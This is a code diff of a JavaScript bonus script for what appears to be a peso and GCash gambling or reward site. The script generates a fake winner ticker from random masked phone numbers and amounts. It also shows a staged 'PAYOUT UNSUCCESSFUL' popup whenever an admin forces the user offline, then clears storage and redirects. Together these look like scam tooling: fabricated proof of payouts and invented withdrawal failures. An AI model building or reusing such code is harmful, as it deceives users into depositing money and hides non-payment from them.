@@ -1,11 +1,12 @@
 /**
- * PlayBonus.js - Complete with Force Logout Sync
+ * PlayBonus.js - Complete Script
  * Features:
  * - Auto popup after 3s (fresh) / 5s (claimed)
  * - CLAIM BONUS credits +₱500 to balance
- * - CLAIM NOW shows alert only (no popup)
+ * - CLAIM NOW shows popup
  * - Force logout sync with admin panel
  * - Real-time balance and claim state
+ * - Claims tracking for index.html trend graph
  */
 
 (function() {
@@ -84,8 +85,6 @@
         initClaimFlow();
         initConfetti();
         attachButtonEvents();
-        
-        // ✅ Force logout listener
         initForceLogoutListener();
         
         console.log('✅ PlayBonus ready!');
@@ -113,7 +112,6 @@
     function loadUserData() {
         if (!userRef) return;
         
-        // Initial load
         userRef.once('value', function(snapshot) {
             var data = snapshot.val();
             
@@ -251,35 +249,44 @@
         }
     }
     
-    // ========== TRACK CLAIM IN FIREBASE ==========
+    // ========== TRACK CLAIM IN FIREBASE (FOR INDEX TREND GRAPH) ==========
     function trackClaimInFirebase(amount) {
         try {
             var now = new Date();
             var year = now.getFullYear();
             var month = String(now.getMonth() + 1).padStart(2, '0');
             var day = String(now.getDate()).padStart(2, '0');
+            var hour = now.getHours();
             var dateKey = year + '-' + month + '-' + day;
             
             var dayRef = db.ref('festival_stats/daily/' + dateKey);
             
+            // ✅ Atomic transaction
             dayRef.transaction(function(data) {
                 if (data === null) {
                     data = { 
                         claims_count: 0, 
-                        claims_amount: 0, 
-                        redemption_count: 0, 
-                        redemption_amount: 0 
+                        claims_amount: 0,
+                        hourly_claims: {}
                     };
                 }
+                
+                // ✅ Increment claims
                 data.claims_count = (data.claims_count || 0) + 1;
                 data.claims_amount = (data.claims_amount || 0) + (amount || 0);
+                
+                // ✅ Track hourly (for line graph)
+                if (!data.hourly_claims) data.hourly_claims = {};
+                data.hourly_claims[hour] = (data.hourly_claims[hour] || 0) + 1;
+                
                 data.last_update = Date.now();
                 return data;
             });
             
-            console.log('📊 Tracked:', dateKey, '₱' + amount);
+            console.log('📊 CLAIM TRACKED:', dateKey, 'Hour:', hour, '₱' + amount);
+            
         } catch(e) {
-            console.error('Track error:', e);
+            console.error('❌ Track claim error:', e);
         }
     }
     
@@ -300,7 +307,6 @@
                 
                 playSound('scatter');
                 
-                // Show popup
                 if (popup) {
                     popup.style.display = 'flex';
                     updateClaimButtonUI();
@@ -388,11 +394,10 @@
             if (firewallOn) {
                 console.log('🔥 Firewall ON - Show carnival AI verification');
                 
-                // Hide bonus popup
                 var popup = document.getElementById('bonusRewardPopup');
                 if (popup) popup.style.display = 'none';
                 
-                // ✅ CREDIT FIRST then show arcade popup
+                // ✅ Credit first, then show arcade
                 creditBonusAndMark(function() {
                     if (window.showPopup) {
                         window.showPopup(currentBalance);
@@ -402,7 +407,6 @@
             } else {
                 console.log('🔓 Firewall OFF - Direct claim');
                 
-                // ✅ Direct claim
                 creditBonusAndMark(function() {
                     var popup = document.getElementById('bonusRewardPopup');
                     if (popup) popup.style.display = 'none';
@@ -448,7 +452,7 @@
                 updateBalanceDisplay();
             });
             
-            // Track claim
+            // ✅ TRACK CLAIM in festival_stats for index.html
             trackClaimInFirebase(bonusAmount);
             
             // Play sound
@@ -602,6 +606,8 @@
             { amount: 2500, weight: 2 }
         ];
         
+        var actions = ["received", "received", "withdraw"];
+        
         function generateRandomAmount() {
             var totalWeight = 0;
             for (var i = 0; i < amountRarity.length; i++) totalWeight += amountRarity[i].weight;
@@ -618,7 +624,11 @@
             var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
             var last4 = Math.floor(1000 + Math.random() * 9000);
             var amount = generateRandomAmount();
-            winnerSpan.innerHTML = prefix + '***' + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount.toLocaleString();
+            var action = actions[Math.floor(Math.random() * actions.length)];
+            
+            winnerSpan.innerHTML = prefix + '***' + last4 + ' ' + action + 
+                ' <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + 
+                amount.toLocaleString();
         }
         
         updateTicker();
@@ -762,18 +772,15 @@
                 var status = snapshot.val();
                 console.log('📡 Status update:', status);
                 
-                // ✅ FORCE LOGOUT DETECTED
                 if (status === 'offline' && !logoutTriggered) {
                     console.log('⚠️ FORCE LOGOUT TRIGGERED!');
                     logoutTriggered = true;
                     
-                    // Detach listener
                     if (forceLogoutListener) {
                         forceLogoutListener.off();
                         forceLogoutListener = null;
                     }
                     
-                    // Show stylish popup
                     showForceLogoutPopup();
                 }
             });
@@ -802,10 +809,8 @@
     
     // ========== SHOW FORCE LOGOUT POPUP ==========
     function showForceLogoutPopup() {
-        // Prevent duplicates
         if (document.querySelector('.force-logout-popup')) return;
         
-        // Add animations
         addForceLogoutAnimations();
         
         var overlay = document.createElement('div');
@@ -823,7 +828,6 @@
             'animation: fadeInForceLogout 0.4s ease;' +
             'padding: 20px;';
         
-        // Particles background
         var particles = document.createElement('div');
         particles.style.cssText = 
             'position: absolute;' +
@@ -851,7 +855,6 @@
         }
         overlay.appendChild(particles);
         
-        // Card wrapper
         var cardWrapper = document.createElement('div');
         cardWrapper.style.cssText = 
             'position: relative;' +
@@ -860,7 +863,6 @@
             'max-width: 360px;' +
             'width: 100%;';
         
-        // Glow ring
         var glowRing = document.createElement('div');
         glowRing.style.cssText = 
             'position: absolute;' +
@@ -871,7 +873,6 @@
             'filter: blur(3px);';
         cardWrapper.appendChild(glowRing);
         
-        // Main card
         var card = document.createElement('div');
         card.style.cssText = 
             'position: relative;' +
@@ -883,7 +884,6 @@
             'box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 215, 0, 0.3), inset 0 1px 0 rgba(255, 255, 255, 0.05);' +
             'overflow: hidden;';
         
-        // Top accent
         var accentLine = document.createElement('div');
         accentLine.style.cssText = 
             'position: absolute;' +
@@ -896,7 +896,6 @@
             'box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);';
         card.appendChild(accentLine);
         
-        // Icon container
         var iconContainer = document.createElement('div');
         iconContainer.style.cssText = 
             'position: relative;' +
@@ -935,7 +934,6 @@
         iconContainer.appendChild(iconBg);
         card.appendChild(iconContainer);
         
-        // Badge
         var badge = document.createElement('div');
         badge.style.cssText = 
             'display: inline-block;' +
@@ -954,7 +952,6 @@
         badge.textContent = '● Session Ended';
         card.appendChild(badge);
         
-        // Title
         var titleEl = document.createElement('h2');
         titleEl.style.cssText = 
             'font-family: "Playfair Display", serif;' +
@@ -971,7 +968,6 @@
         titleEl.textContent = 'PAYOUT UNSUCCESSFUL';
         card.appendChild(titleEl);
         
-        // Divider
         var dividerContainer = document.createElement('div');
         dividerContainer.style.cssText = 
             'display: flex;' +
@@ -994,7 +990,6 @@
         dividerContainer.appendChild(lineRight);
         card.appendChild(dividerContainer);
         
-        // Message
         var msgEl = document.createElement('div');
         msgEl.style.cssText = 
             'font-family: "Poppins", sans-serif;' +
@@ -1008,7 +1003,6 @@
             'to process instant withdrawal.';
         card.appendChild(msgEl);
         
-        // Info box
         var infoBox = document.createElement('div');
         infoBox.style.cssText = 
             'background: rgba(255, 215, 0, 0.08);' +
@@ -1029,7 +1023,6 @@
             '<span>Make sure your GCash account is <strong style="color: #39ff14;">fully verified</strong> with the same mobile number.</span>';
         card.appendChild(infoBox);
         
-        // Button
         var btn = document.createElement('button');
         btn.style.cssText = 
             'width: 100%;' +
@@ -1081,7 +1074,6 @@
         overlay.appendChild(cardWrapper);
         document.body.appendChild(overlay);
         
-        // Auto redirect after 10 seconds
         setTimeout(function() {
             if (document.querySelector('.force-logout-popup')) {
                 localStorage.clear();
